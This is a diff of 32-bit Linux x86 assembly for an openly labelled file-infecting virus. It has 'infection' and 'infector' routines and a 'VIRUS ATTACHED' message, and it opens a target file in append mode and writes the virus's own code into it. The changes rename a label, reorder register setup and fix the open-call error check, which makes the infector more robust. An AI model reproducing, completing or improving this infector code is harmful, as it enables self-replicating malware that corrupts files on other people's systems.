@@ -12,7 +12,7 @@ section .text
     len_virus_msg: equ $-virus_msg
     virus_attached: db "VIRUS ATTACHED", 0x0A, 0
     len_virus_attached: equ $-virus_attached
-    new_line: db 0x0A, 0
+    newline: db 0x0A, 0
     
 
 section .text
@@ -73,9 +73,9 @@ infection:
     pushad
 
     mov     edx, len_virus_msg
-    mov     eax, syscall_write
-    mov     ebx, stdout
     mov     ecx, virus_msg
+    mov     ebx, stdout
+    mov     eax, syscall_write
 
     int     0x80
 
@@ -114,7 +114,7 @@ infector:
     int 0x80
 
     mov edx, 1
-    mov ecx, new_line
+    mov ecx, newline
     mov ebx, stdout
     mov eax, syscall_write
     int 0x80
@@ -123,23 +123,23 @@ infector:
     jle error
 
     ; 2) open the file
-    mov eax, 5
-    mov ebx, [ebp+8]
-    mov ecx, O_WRONLY | O_APPEND
     mov edx, 0777
+    mov ecx, O_WRONLY | O_APPEND
+    mov ebx, [ebp+8]
+    mov eax, 5
     int 0x80
 
-    cmp eax, -1
-    je error
+    cmp eax, 0
+    jl error
 
     mov [ebp-4], eax
 
     ; 3) add the code
-    mov eax, 4
-    mov ebx, [ebp - 4]
-    mov ecx, code_start
     mov edx, code_end
     sub edx, code_start
+    mov ecx, code_start
+    mov ebx, [ebp-4]
+    mov eax, syscall_write
     int 0x80
 
     cmp eax, 0
@@ -147,7 +147,7 @@ infector:
 
   ; 4) close the file
     mov eax, 6
-    mov ebx, [ebp - 4]
+    mov ebx, [ebp-4]
     int 0x80
 
     cmp eax, -1
